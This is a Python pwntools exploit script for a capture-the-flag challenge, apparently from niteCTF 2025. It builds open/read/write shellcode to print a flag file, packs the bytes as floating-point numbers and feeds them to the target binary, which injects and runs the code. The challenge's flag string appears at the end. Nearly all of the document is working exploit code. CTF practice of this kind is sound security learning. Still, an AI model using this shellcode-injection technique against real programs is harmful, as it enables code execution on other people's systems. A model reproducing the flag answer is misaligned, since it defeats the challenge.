from pwn import *
import struct

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./chall', '''
    continue
''')

# p = remote('dancer.chals.nitectf25.live', 1337, ssl=True)

# encrypt shellcode payload and convert to floats
shellcode = asm(shellcraft.open('flag')+shellcraft.read('rax', 'rsp', 0x40)+shellcraft.write(1, 'rsp', 0x40))
if len(shellcode) % 8 != 0:
    shellcode += b'\x90'*(8-(len(shellcode)%8))
shellcode_floats = []
for i in range(0, len(shellcode), 8):
    shellcode_floats.append(struct.unpack('d', shellcode[i:i+8])[0])

# perform shellcode injection
p.sendlineafter(b"enter the number of floats you want to enter!", str(len(shellcode_floats)).encode())
for shellcode_float in shellcode_floats:
    p.sendline(str(shellcode_float).encode())

p.interactive()

# nite{W4stem4n_dr41nss_aLLth3_fl04Ts_int0_ex3cut5bl3_sp4ce}